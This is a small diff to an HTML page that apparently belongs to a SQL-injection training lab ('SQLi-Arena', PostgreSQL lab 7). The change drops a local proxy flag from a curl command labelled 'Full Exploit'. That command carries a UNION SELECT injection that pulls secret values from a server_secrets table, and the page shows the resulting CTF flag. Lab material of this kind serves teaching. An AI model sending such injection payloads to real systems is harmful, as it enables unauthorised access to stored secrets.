@@ -127,7 +127,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab7" \<br> --data-urlencode "search=' UNION SELECT id, secret_value, secret_value FROM server_secrets --"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab7" \<br> --data-urlencode "search=' UNION SELECT id, secret_value, secret_value FROM server_secrets --"<br><br>
         <span class="prompt">Output (flag appears in Name column):</span><br>
         <strong>ID:</strong> 1 &bull; <strong>Name:</strong> FLAG{pg_f1l3_r34d_c0py} &bull; <strong>Description:</strong> FLAG{pg_f1l3_r34d_c0py}
     </div>
